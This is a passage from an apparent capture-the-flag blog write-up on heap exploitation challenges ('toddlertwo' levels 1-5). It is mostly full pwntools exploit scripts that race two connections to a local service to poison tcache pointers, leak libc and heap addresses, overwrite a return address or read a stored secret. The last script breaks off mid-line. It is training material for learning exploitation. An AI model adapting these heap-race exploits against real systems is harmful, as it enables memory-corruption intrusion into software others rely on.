class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">r1.sendline(<span class="hljs-string">b&#x27;malloc 2&#x27;</span>) <span class="hljs-comment">#make sure it exists.</span><br>arbitrary_write(r1, r2, <span class="hljs-number">0x405220</span>+<span class="hljs-number">0x10</span>, <span class="hljs-number">0x405655</span>)<br>r1.sendline(<span class="hljs-string">b&#x27;printf 2&#x27;</span>) <span class="hljs-comment">#print it out.</span><br>r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>pwd = r1.clean() <span class="hljs-comment">#finally we get the pwd.</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;PWD : &quot;</span>, pwd)<br>r1.sendline(<span class="hljs-string">b&#x27;send_flag &#x27;</span>+pwd) <br></code></pre></div></td></tr></table></figure><p>full exp:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> pwn<br><span class="hljs-keyword">import</span> os<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_perthread_addr</span>(<span class="hljs-params">r1,r2</span>):</span><br>    <span class="hljs-keyword">if</span> os.fork()==<span class="hljs-number">0</span>:<br>        r1.sendline(<span class="hljs-string">b&quot;malloc 0 scanf 0 AAAAAAAABBBBBBBB free 0 &quot;</span>*<span class="hljs-number">10000</span>)<br>        exit()<br>    r2.sendline(<span class="hljs-string">b&quot;printf 0 &quot;</span>*<span class="hljs-number">10000</span>)<br>    os.wait()<br>    time.sleep(<span class="hljs-number">0.5</span>)<br>    output = r2.clean()<br>    r1.clean()<br>    leak = <span class="hljs-built_in">next</span>(a <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> output.split() <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;\x7f&#x27;</span> <span class="hljs-keyword">in</span> a)[<span class="hljs-number">8</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>)<br>    r1.sendline(<span class="hljs-string">b&#x27;malloc 0&#x27;</span>)<br>    <span class="hljs-keyword">return</span> pwn.u64(leak)<br><br>perthread_leak = <span class="hljs-number">0</span>   <br>idx = <span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">controlled_allocation</span>(<span class="hljs-params">r1, r2, addr, idx_=<span class="hljs-literal">None</span></span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">if</span> idx_ == <span class="hljs-literal">None</span>: <span class="hljs-comment">#å—¯, å¥½åƒæ²¡ä»€ä¹ˆç”¨.</span><br>        idx_ = idx<br>    <span class="hljs-keyword">global</span> perthread_leak<br>    chunk_0_addr = perthread_leak + <span class="hljs-number">0x650</span><br>    chunk_idx_addr = perthread_leak + <span class="hljs-number">0x650</span> + <span class="hljs-number">0x410</span>*idx<br>        <br>    packed = pwn.p64( (chunk_0_addr&gt;&gt;<span class="hljs-number">12</span>)^addr )<br>    r1.clean(),r2.clean()<br>    r1.sendline(<span class="hljs-string">f&#x27;malloc <span class="hljs-subst">&#123;idx_&#125;</span>&#x27;</span>)<br>    r1.sendline(<span class="hljs-string">f&#x27;free <span class="hljs-subst">&#123;idx_&#125;</span>&#x27;</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment">#after pass scanf check -&gt; free it -&gt; then overwrite tcache next pointer</span><br>        <span class="hljs-keyword">if</span> os.fork() == <span class="hljs-number">0</span>:<br>            r1.sendline(<span class="hljs-string">f&#x27;free 0&#x27;</span>.encode())<br>            os.kill(os.getpid(), <span class="hljs-number">9</span>)<br>            <br>        r2.send((<span class="hljs-string">b&#x27;scanf 0 &#x27;</span> + packed + <span class="hljs-string">b&#x27;\n&#x27;</span>)*<span class="hljs-number">2000</span>)<br>        os.wait()<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 0 printf 0&#x27;</span>)<br>        r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>        output = r1.recvline()[:-<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> output == packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>)[<span class="hljs-number">0</span>]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;OUTPUT: &#x27;</span> + output + <span class="hljs-string">b&#x27; PACKED: &#x27;</span>, packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-comment">#malloc the controlled chunk</span><br>    r1.sendline(<span class="hljs-string">f&#x27;malloc <span class="hljs-subst">&#123;idx_&#125;</span>&#x27;</span>)<br>    idx = idx_ + <span class="hljs-number">1</span><br>    <br><span class="hljs-comment">#support 8 bytes read</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_read</span>(<span class="hljs-params">r1, r2, addr, idx_=<span class="hljs-literal">None</span></span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">if</span> idx_ == <span class="hljs-literal">None</span>: <span class="hljs-comment">#å—¯, å¥½åƒæ²¡ä»€ä¹ˆç”¨.</span><br>        idx_ = idx<br>    controlled_allocation(r1, r2, addr, idx_)<br>    r1.sendline(<span class="hljs-string">f&#x27;printf <span class="hljs-subst">&#123;idx_-<span class="hljs-number">1</span>&#125;</span>&#x27;</span>)<br>    r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>    output = r1.clean()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;MESSAGE IS: &#x27;</span>, output)<br>    <span class="hljs-keyword">return</span> output<br>    <br><span class="hljs-comment">#support digital write</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_write</span>(<span class="hljs-params">r1, r2, addr, value</span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    controlled_allocation(r1, r2, addr)<br>    <span class="hljs-comment">#è¿™é‡Œå¿˜åŠ ä¸Šcontext.binaryçš„è®¾ç½®ç›´æ¥ç»™æˆ‘é»˜è®¤i386æ¶æ„, valueç»™æˆ‘4å­—èŠ‚å¯¹é½</span><br>    r1.sendline(<span class="hljs-string">b&#x27;scanf %d &#x27;</span>%(idx-<span class="hljs-number">1</span>) + pwn.flat([value]))<br><br><span class="hljs-keyword">try</span>:<br>    p.kill(),r1.close(),r2.close()<br><span class="hljs-keyword">except</span> Exception:<br>    <span class="hljs-keyword">pass</span><br>pwn.context.log_level=<span class="hljs-string">&#x27;info&#x27;</span><br>pwn.context.binary = <span class="hljs-string">&#x27;./toddlertwo_level1.0.elf64&#x27;</span><br>p=pwn.process(<span class="hljs-string">&quot;./toddlertwo_level1.0.elf64&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;p.pid&#125;</span>/maps&quot;</span> ).read())<br>r1 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>r2 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br><br>perthread_leak = leak_perthread_addr(r1,r2);<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LEAKED: PERTHREAD: &quot;</span>, <span class="hljs-built_in">hex</span>(perthread_leak))<br><span class="hljs-comment">#main_arena_ptr_address = perthread_leak - 0x8d0 + 0x890</span><br><span class="hljs-comment">#pwn.gdb.attach(p, &quot;b *challenge+0x19b\nb *challenge+0x302\ninit-pwndbg\nc\n&quot;)</span><br><span class="hljs-comment">#main_arena_addr = pwn.u64(arbitrary_read(r1, r2, main_arena_ptr_address)[:-1].ljust(8, b&#x27;\0&#x27;))</span><br><span class="hljs-comment">#print(&quot;MAIN ARENA ADDR: &quot;, hex(main_arena_addr))</span><br><span class="hljs-comment">#pwn.gdb.attach(p, &quot;b challenge+0x10b\ninit-pwndbg\nc\n&quot;)</span><br><span class="hljs-comment">#libc_base = main_arena_addr - 0x1bdba0</span><br><span class="hljs-comment">#print(&#x27;LIBC BASE: &#x27;, hex(libc_base))</span><br><span class="hljs-comment">#secretCorrect_frame_base = libc_base - 0x4640</span><br><span class="hljs-comment">#print(&quot;SECRET FRAME BASE: &quot;, hex(secretCorrect_frame_base))</span><br><span class="hljs-comment">#pwn.gdb.attach(p, &quot;b *challenge+0x19b\nb *challenge+0x302\ninit-pwndbg\nc\n&quot;)</span><br><span class="hljs-comment">#arbitrary_read(r1, r2, 0x405650, 2)</span><br>r1.sendline(<span class="hljs-string">b&#x27;malloc 2&#x27;</span>)<br>arbitrary_write(r1, r2, <span class="hljs-number">0x405220</span>+<span class="hljs-number">0x10</span>, <span class="hljs-number">0x405655</span>)<br>r1.sendline(<span class="hljs-string">b&#x27;printf 2&#x27;</span>)<br>r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>pwd = r1.clean()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;PWD : &quot;</span>, pwd)<br>r1.sendline(<span class="hljs-string">b&#x27;send_flag &#x27;</span>+pwd)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(a <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> r1.clean().split(<span class="hljs-string">b&#x27;\n&#x27;</span>) <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#123;&#x27;</span> <span class="hljs-keyword">in</span> a))<br>pwn.gdb.attach(p, <span class="hljs-string">&quot;init-pwndbg\n&quot;</span>)<br></code></pre></div></td></tr></table></figure><p>there is no difference between .0 and .1 level. </p><h4 id="level2-4"><a href="#level2-4" class="headerlink" title="level2"></a>level2</h4><p>protections are all turned on.</p><p>there is no <code>load_secret()</code> function in main, so the last way may be rewriting the retrun address of <code>challenge()</code>.</p><p>for test:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">p/d (<span class="hljs-keyword">int</span>[<span class="hljs-number">15</span>])stored<br>p/x (<span class="hljs-keyword">char</span>*[<span class="hljs-number">15</span>])messages<br></code></pre></div></td></tr></table></figure><p>itâ€™s so hard to do with libc-2.33. the memory align check is annoying. just assuming that the binary base is already known.</p><p>fail exp:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> pwn<br><span class="hljs-keyword">import</span> os<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_perthread_addr</span>(<span class="hljs-params">r1,r2</span>):</span><br>    <span class="hljs-keyword">if</span> os.fork()==<span class="hljs-number">0</span>:<br>        r1.sendline(<span class="hljs-string">b&quot;malloc 0 scanf 0 AAAAAAAABBBBBBBB free 0 &quot;</span>*<span class="hljs-number">10000</span>)<br>        exit()<br>    r2.sendline(<span class="hljs-string">b&quot;printf 0 &quot;</span>*<span class="hljs-number">10000</span>)<br>    os.wait()<br>    time.sleep(<span class="hljs-number">0.01</span>)<br>    output = r2.clean()<br>    r1.clean()<br>    leak = <span class="hljs-built_in">next</span>(a <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> output.split() <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;\x7f&#x27;</span> <span class="hljs-keyword">in</span> a)[<span class="hljs-number">8</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>)<br>    r1.sendline(<span class="hljs-string">b&#x27;malloc 0&#x27;</span>)<br>    <span class="hljs-keyword">return</span> pwn.u64(leak)<br><br>perthread_leak = <span class="hljs-number">0</span>   <br>idx = <span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">controlled_allocation</span>(<span class="hljs-params">r1, r2, addr</span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">global</span> perthread_leak<br>    chunk_0_addr = perthread_leak + <span class="hljs-number">0x650</span><br>        <br>    packed = pwn.p64( (chunk_0_addr&gt;&gt;<span class="hljs-number">12</span>)^addr )<br>    r1.clean(),r2.clean()<br>    r1.sendline(<span class="hljs-string">f&#x27;malloc <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>)<br>    r1.sendline(<span class="hljs-string">f&#x27;free <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment">#after pass scanf check -&gt; free it -&gt; then overwrite tcache next pointer</span><br>        <span class="hljs-keyword">if</span> os.fork() == <span class="hljs-number">0</span>:<br>            r1.sendline(<span class="hljs-string">f&#x27;free 0&#x27;</span>.encode())<br>            os.kill(os.getpid(), <span class="hljs-number">9</span>)<br>            <br>        r2.send((<span class="hljs-string">b&#x27;scanf 0 &#x27;</span> + packed + <span class="hljs-string">b&#x27;\n&#x27;</span>)*<span class="hljs-number">2000</span>)<br>        os.wait()<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 0 printf 0&#x27;</span>)<br>        output = <span class="hljs-string">b&#x27;&#x27;</span><br>        r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>        output = r1.recvline()[:-<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> output == packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>)[<span class="hljs-number">0</span>]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;OUTPUT: &#x27;</span> + output + <span class="hljs-string">b&#x27; PACKED: &#x27;</span>, packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-comment">#malloc the controlled chunk</span><br>    r1.sendline(<span class="hljs-string">f&#x27;malloc <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>.encode())<br>    idx += <span class="hljs-number">1</span><br>    <br><span class="hljs-comment">#support 8 bytes read</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_read</span>(<span class="hljs-params">r1, r2, addr, unalign=<span class="hljs-literal">False</span></span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">if</span> unalign:<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 10&#x27;</span>)<br>        arbitrary_write(r1, r2, binary_base+<span class="hljs-number">0x5040</span>+<span class="hljs-number">0x8</span>*<span class="hljs-number">10</span>, addr)<br>        r1.sendline(<span class="hljs-string">b&#x27;printf 10&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        controlled_allocation(r1, r2, addr)<br>        r1.sendline(<span class="hljs-string">f&#x27;printf <span class="hljs-subst">&#123;idx-<span class="hljs-number">1</span>&#125;</span>&#x27;</span>.encode())<br>    r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>    output = r1.clean()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;MESSAGE IS: &#x27;</span>, output)<br>    pwn.context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>    <span class="hljs-keyword">return</span> output<br>    <br><span class="hljs-comment">#support digital write</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_write</span>(<span class="hljs-params">r1, r2, addr, value, unalign=<span class="hljs-literal">False</span></span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">if</span> unalign:<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 10&#x27;</span>)<br>        arbitrary_write(r1, r2, binary_base+<span class="hljs-number">0x5040</span>++<span class="hljs-number">0x8</span>*<span class="hljs-number">10</span>, addr)<br>        r1.sendline(<span class="hljs-string">b&#x27;scanf 10 &#x27;</span> + value[<span class="hljs-number">0</span>].to_bytes(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;little&#x27;</span>))<br>        <span class="hljs-keyword">return</span><br>    controlled_allocation(r1, r2, addr)<br>    r1.sendline(<span class="hljs-string">b&#x27;scanf %d &#x27;</span>%(idx-<span class="hljs-number">1</span>) + pwn.flat(value))<br><br><span class="hljs-keyword">try</span>:<br>    p.kill(),r1.close(),r2.close()<br><span class="hljs-keyword">except</span> Exception:<br>    <span class="hljs-keyword">pass</span><br>pwn.context.log_level=<span class="hljs-string">&#x27;info&#x27;</span><br>pwn.context.binary = <span class="hljs-string">&#x27;./toddlertwo_level2.0.elf64&#x27;</span><br>p=pwn.process(<span class="hljs-string">&quot;./toddlertwo_level2.0.elf64&quot;</span>)<br>p.clean()<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;p.pid&#125;</span>/maps&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-built_in">print</span>(f.read())<br>r1 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>r2 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br><br>perthread_leak = leak_perthread_addr(r1,r2);<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LEAKED: PERTHREAD: &quot;</span>, <span class="hljs-built_in">hex</span>(perthread_leak))<br>main_arena_ptr_address = perthread_leak - <span class="hljs-number">0x8d0</span> + <span class="hljs-number">0x890</span><br>time.sleep(<span class="hljs-number">0.2</span>)<br>main_arena_addr = pwn.u64(arbitrary_read(r1, r2, main_arena_ptr_address)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;MAIN ARENA ADDR: &quot;</span>, <span class="hljs-built_in">hex</span>(main_arena_addr))<br>libc_base = main_arena_addr - <span class="hljs-number">0x1bdba0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;LIBC BASE: &#x27;</span>, <span class="hljs-built_in">hex</span>(libc_base))<br>stored_rip_addr = main_arena_addr - <span class="hljs-number">0x1c1d78</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;STORED RIP ADDR: &#x27;</span>, <span class="hljs-built_in">hex</span>(stored_rip_addr))<br><span class="hljs-comment">#stored_rip = pwn.u64(arbitrary_read(r1, r2, stored_rip_addr, True)[:-1].ljust(8, b&#x27;\0&#x27;))</span><br><span class="hljs-comment">#print(&#x27;STORED RIP: &#x27;, stored_rip)</span><br>binary_base = <span class="hljs-number">0</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;p.pid&#125;</span>/maps&quot;</span>) <span class="hljs-keyword">as</span> f: <br>    binary_base = <span class="hljs-built_in">int</span>(f.read(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;BINARY BASE: &#x27;</span>, <span class="hljs-built_in">hex</span>(binary_base))<br><span class="hljs-comment">#LET&#x27;S ROLLING</span><br>win_addr = binary_base + <span class="hljs-number">0x1778</span><br>arbitrary_write(r1, r2, stored_rip_addr, [win_addr], <span class="hljs-literal">True</span>)<br>r1.sendline(<span class="hljs-string">b&#x27;quit&#x27;</span>)<br>p.clean()<br><span class="hljs-built_in">print</span>(r1.clean().decode())<br></code></pre></div></td></tr></table></figure><h4 id="level3-5"><a href="#level3-5" class="headerlink" title="level3"></a>level3</h4><p>a hint from the code:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">fwrite(<span class="hljs-string">&quot;Storing the secret in this thread&#x27;s stack.\n&quot;</span>, <span class="hljs-number">1uLL</span>, <span class="hljs-number">0x2B</span>uLL, (FILE *)__readfsqword(<span class="hljs-number">0xFFFFFFF8</span>));<br>load_secret(&amp;v5);<br></code></pre></div></td></tr></table></figure><p>so itâ€™s quite easy, just need to locate the challengeâ€™s frame base. </p><p>the stored_rip_addr is at a constant offset from the challengeâ€™s frame base.</p><h4 id="level4-6"><a href="#level4-6" class="headerlink" title="level4"></a>level4</h4><p>nothing special</p><h4 id="level5-7"><a href="#level5-7" class="headerlink" title="level5"></a>level5</h4><p>Storing the secret in the environment by <code>setenv()</code>. env is pointed by the <code>environ</code> in libc. i need to have a look at that blog to learn how to dig into ld library. let me add a new section in key points.</p><p>distance libc_base ld_base = 0x1df000 bytes. the secret is stored in the <strong>main thread heap</strong>. </p><p><strong>plan:</strong> </p><blockquote><p>wrong start:</p><ul><li><del>at first read out of the <strong>binary base</strong>(in kali the only way i can is cheatâ€¦)</del></li><li><del>locating the env string in heap. read out of it.</del></li></ul></blockquote><ul><li>after read out the main_arenaâ€™s base, read out the <code>top</code> field content, which is the top chunk of the main thread near the binary. it wonâ€™t change when child threads receiving and processing commands.</li><li>next locate the distance between the top_chunk and secretâ€™s address. this is also a constant.</li><li>read out the secret.</li><li>then use <code>send_flag</code> command.</li><li><del>or just change the return address of challenge.</del> </li></ul><p>exp(the second method):</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> pwn<br><span class="hljs-keyword">import</span> os<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_perthread_addr</span>(<span class="hljs-params">r1,r2</span>):</span><br>    <span class="hljs-keyword">if</span> os.fork()==<span class="hljs-number">0</span>:<br>        r1.sendline(<span class="hljs-string">b&quot;malloc 0 scanf 0 AAAAAAAABBBBBBBB free 0 &quot;</span>*<span class="hljs-number">10000</span>)<br>        exit()<br>    r2.sendline(<span class="hljs-string">b&quot;printf 0 &quot;</span>*<span class="hljs-number">10000</span>)<br>    os.wait()<br>    time.sleep(<span class="hljs-number">0.01</span>)<br>    output = r2.clean()<br>    r1.clean()<br>    leak = <span class="hljs-built_in">next</span>(a <span 